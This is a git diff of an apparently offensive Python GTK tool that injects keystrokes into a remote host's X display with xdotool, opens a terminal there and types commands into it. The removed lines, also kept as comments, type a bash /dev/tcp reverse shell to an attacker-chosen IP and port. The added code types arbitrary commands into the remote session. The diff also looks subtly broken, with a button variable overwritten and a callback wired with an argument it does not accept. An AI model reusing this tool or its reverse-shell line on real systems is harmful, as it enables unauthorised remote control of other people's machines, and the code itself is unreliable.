@@ -70,21 +70,26 @@ class xwin:
 
 		return out
 
-	def on_shell_clicked(self, button, entry):
-		entry_text = entry.get_text()
-		entry.set_text("")
-		if (len(entry_text) == 0):
-			entry.set_text("IP:Port")
-			return
-		if ' ' in entry_text:
-			dest = entry_text.split(' ')
-		else:
-			dest = entry_text.split(':')
+	def open_terminal(self, button):
 		cmd = 'export DISPLAY={} && xdotool key ctrl+alt+t'.format(self.host)
 		os.system(cmd)
 		time.sleep(3)
-		cmd = 'echo "exec 5<>/dev/tcp/{}/{} && cat <&5 | /bin/bash 2>&5 >&5" | /bin/bash'.format(dest[0], dest[1])
-		cmd = 'export DISPLAY={} && xdotool key {}'.format(self.host, self.string_to_xdo(cmd, entry))
+
+	def on_shell_clicked(self, button, entry):
+		entry_text = entry.get_text()
+		# entry.set_text("")
+		# if (len(entry_text) == 0):
+		# 	entry.set_text("IP:Port")
+		# 	return
+		# if ' ' in entry_text:
+		# 	dest = entry_text.split(' ')
+		# else:
+			# dest = entry_text.split(':')
+		# cmd = 'export DISPLAY={} && xdotool key ctrl+alt+t'.format(self.host)
+		# os.system(cmd)
+		# time.sleep(3)
+		# cmd = 'echo "exec 5<>/dev/tcp/{}/{} && cat <&5 | /bin/bash 2>&5 >&5" | /bin/bash'.format(dest[0], dest[1])
+		cmd = 'export DISPLAY={} && xdotool key {}'.format(self.host, self.string_to_xdo(entry_text, entry))
 		os.system(cmd)
 		time.sleep(5)
 		cmd = 'export DISPLAY={} && xdotool key Return'.format(self.host)
@@ -162,8 +167,6 @@ class xwin:
 		if visual and self.screen.is_composited():
 			self.window.set_visual(visual)
 
-
-
 		#self.rgba = self.screen.get_rgba_colormap()
 		#self.window.set_colormap(self.rgba)
 		#self.window.connect('expose-event', self.expose)
@@ -186,8 +189,10 @@ class xwin:
 		self.enter.connect("clicked", self.on_enter_clicked)
 		self.backspace = Gtk.Button(label='Backspace')
 		self.backspace.connect("clicked", self.on_backspace_clicked)
-		self.shell = Gtk.Button(label='R-Shell')
+		self.shell = Gtk.Button(label='SendCmd')
 		self.shell.connect("clicked", self.on_shell_clicked, self.entry)
+		self.shell = Gtk.Button(label='OpenTerminal')
+		self.shell.connect("clicked", self.open_terminal, self.entry)
 
 		self.hbox.add(self.entry)
 		self.bbox.add(self.spr)
